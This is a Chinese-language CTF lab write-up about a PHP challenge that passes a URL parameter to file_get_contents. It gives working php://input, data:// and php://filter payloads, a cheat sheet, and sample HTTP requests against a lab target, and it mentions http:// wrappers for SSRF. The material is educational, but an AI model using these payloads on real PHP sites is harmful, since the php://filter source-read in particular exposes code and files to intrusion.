## 一句话概括

当某个参数被 `file_get_contents($a, 'r')` 当作**文件名 / 资源路径**去读时，`?a=I want flag` 这种普通字符串会被当成"一个不存在的文件"；要传入"内容"，必须用 PHP 的**流封装协议**（`php://input`、`data://`）把内容包装成"可读的资源"。

## 本题情景与解题手法

### 题目形态

题目源码里有一句：

```php
file_get_contents($a, 'r')
```

其中 `$a` 来自 URL 参数。含义是：**把 `a` 的值当成一个文件（资源）打开并读取**（`'r'` 表示 read 模式）。

### 第一步：确认不能直接写明文

直觉上想直接把内容塞进参数：

```text
?a=I want flag
```

但这行不通。`file_get_contents` 的第一个参数是**路径或 URL**，不是"内容"。它会拿 `I want flag` 当文件名去打开，结果自然是打不开、返回 `false`。**问题在于"参数语义是路径，不是值"。**

### 第二步：改用 `php://input`，把内容放进请求体

```text
?a=php://input
```

请求体写：

```text
I want flag
```

`php://input` 是一个**流封装协议**：它代表"HTTP 请求的原始 body"。于是 `file_get_contents('php://input')` 读到的东西 = 请求体原文 = `I want flag`。

### 第三步：或用 `data://` 把内容内联进 URL

不想用请求体，也可以把内容直接编码进 URL：

```text
?a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

`data://` 把"内容本身"当作一个伪文件来读，`base64,` 后面是 `I want flag` 的 Base64。

### 第四步：HackBar 下的写法差异

原笔记特别记了一条工具的坑：

> 若是使用 HackBar，URL 部分相同，而 body 写为 `a=I want flag`，因为它要键值对传参，不可以直接明文传参。

也就是说，用 HackBar 发这个请求时：

- **URL** 仍是 `?a=php://input`；
- **Body** 不能只写一行 `I want flag`，而要写成键值对形式 `a=I want flag`。

> 这一点与"`php://input` 读到的是原始 body 原文"的直觉有出入 —— 差异来自 HackBar 自身对 body 的封装方式。**实际以靶场回显为准**：能读到 `I want flag` 就说明姿势正确，读到的内容变了就调整 body。

### 一句话总结

> 参数被 `file_get_contents($a)` 当**路径**读 → 明文内容不是合法路径，读不到 → 改用流封装协议：`php://input`（内容放请求体）或 `data://text/plain;base64,...`（内容内联进 URL）→ 把"要读的内容"包装成"可读的资源"。

## 原理

### 1. `file_get_contents` 的第一参数是"路径/URL"，不是"内容"

```php
file_get_contents(string $filename, bool $use_include_path = false): string|false
```

- `$filename` 语义：**要读取的文件的路径或 URL**；
- 如果文件不存在，返回 `false` 并抛 warning（例如 `failed to open stream: No such file or directory`）。

所以 `?a=I want flag` 会被当作文件名 `I want flag` 去找 —— 没有这个文件，读失败。

### 2. 流封装协议（Stream Wrapper）才是关键

PHP 的 `file_get_contents` 支持 **URL 形式的封装协议**。当 `$filename` 里出现 `scheme://` 时，PHP 会调用对应封装器，而不是去文件系统找文件。常用封装器：

| 封装协议 | 读取的内容 | 典型用途 |
|---|---|---|
| `php://input` | HTTP 请求的**原始 body** | 把"内容"放请求体传参 |
| `data://text/plain;base64,...` | URL 内联的**任意数据** | 把"内容"内联进 URL |
| `php://filter/...` | 对目标资源做编码/解码后读取 | 读源码时转 Base64 |
| `php://stdin` / `php://stdout` | 标准输入 / 输出 | CLI 场景 |
| `file:///path` | 本地文件系统 | 读本地文件 |
| `http://host/path` | HTTP 资源 | 读远程资源（可配合 SSRF） |

**核心**：`php://`、`data://` 这类协议的返回值**就是一段内容本身**，而不是"某个磁盘文件"。这正是"不能直接写明文，但能写协议"的原因。

### 3. `data://` 的语法

```text
data:[<mediatype>][;base64],<data>
```

| 部分 | 说明 |
|---|---|
| `text/plain` | 媒体类型（可省略，默认 `text/plain;charset=US-ASCII`） |
| `;base64` | 声明后面的数据是 Base64 编码 |
| `,<data>` | 逗号后是正文 |

两种写法：

```text
?a=data://text/plain,I want flag
?a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

Base64 方式更稳，能避免空格、特殊字符在 URL 里被截断或转义。

### 4. `php://input` 的语义

`php://input` 是一个只读流，指向**请求体的原始数据**：

- **GET 请求**：通常没有 body，读到的可能是空；
- **POST 请求**：读到的是 POST 的原始 body（`Content-Type: multipart/form-data` 时不可用）。

所以原始 payload 的关键在于"**用 POST 发、把内容写进 body**"。

## 利用条件

1. **参数被当作文件路径/资源读取**（`file_get_contents($a)`、`include($a)`、`fopen($a)` 等）
2. **`allow_url_fopen` 开启**（`data://`、`http://` 等需要；`php://` 一般不受此限）
3. 使用 `data://` 时，需要环境未禁用该封装（部分 `open_basedir` / 安全配置会限制）
4. 使用 `php://input` 时，**必须走 POST** 且内容在 body 里

## Payload 速查

| 目的 | 写法 |
|---|---|
| 明文直接放进参数（**不可行**） | `?a=I want flag` |
| 内容放请求体 | URL `?a=php://input`，body 写内容 |
| 内容内联（明文） | `?a=data://text/plain,I want flag` |
| 内容内联（Base64） | `?a=data://text/plain;base64,SSB3YW50IGZsYWc=` |
| 读源码（Base64） | `?a=php://filter/read=convert.base64-encode/resource=index.php` |
| HackBar 传参 | URL `?a=php://input`，body 写 `a=I want flag` |

## 完整示例

**方式一：`php://input`**

```http
POST /index.php?a=php://input HTTP/1.1
Host: 靶机地址
Content-Type: text/plain
Content-Length: 11

I want flag
```

**方式二：`data://`**

```http
GET /index.php?a=data://text/plain;base64,SSB3YW50IGZsYWc= HTTP/1.1
Host: 靶机地址
```

其中：

```bash
echo -n "I want flag" | base64
# SSB3YW50IGZsYWc=
```

## 踩坑与备注

- **判断"参数是路径还是值"**：看源码里它被交给了谁。给了 `file_get_contents` / `include` / `fopen` / `readfile`，那就是路径；给了 `echo` / 字符串拼接，那才是值。方向判错，后面全是白费。
- **`'r'` 只是读模式**：`file_get_contents($a, 'r')` 里的 `'r'` 不改变"要传路径"的本质。
- **HackBar 的 body 写法**是原笔记记录的工具差异，与 `php://input` 读原始 body 的直觉略有出入；本文如实保留该记录，并注明以靶场回显为准 —— 不做过度发挥。
- **`data://` 里别漏逗号**：`data://text/plain;base64,<data>` 中 `;base64` 与正文之间的 `,` 是分隔符，漏了就读不到。
- **`php://input` 在 multipart 下读不到**：如果请求是 `multipart/form-data`，`php://input` 不可用（PHP 已消费了 body）。这时改用 `data://` 或普通表单字段。
